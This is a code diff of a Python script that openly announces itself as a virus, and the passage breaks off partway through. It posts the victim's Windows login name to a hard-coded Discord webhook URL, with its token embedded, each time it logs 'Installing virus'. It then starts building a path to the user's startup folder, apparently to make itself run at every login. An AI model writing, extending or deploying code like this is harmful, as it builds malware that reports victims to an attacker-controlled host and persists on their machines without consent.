@@ -1,6 +1,10 @@
 import os, sys, shutil, requests
 PYTHON_COMMAND = sys.executable
 
+if sys.platform != "win32":
+    print("This is ment for windows only. \nExiting...")
+    exit(1)
+
 def log_to_discord(msg:str, important=False):
     data = {"username":f"User:{os.getlogin()}", "content":msg}
     try:
@@ -9,12 +13,7 @@ def log_to_discord(msg:str, important=False):
             requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
     except:
         print("Failed to send port request")
-
-if sys.platform != "win32":
-    print("This is ment for windows only. \nExiting...")
-    log_to_discord("Someone tried executing this on non-windows", important=True)
-    exit(1)
-log_to_discord("Installing virus", important=True)
+log_to_discord("**Installing virus**", important=True)
 
 home_dir = os.path.expanduser("~")
 startup_folder = os.path.join(
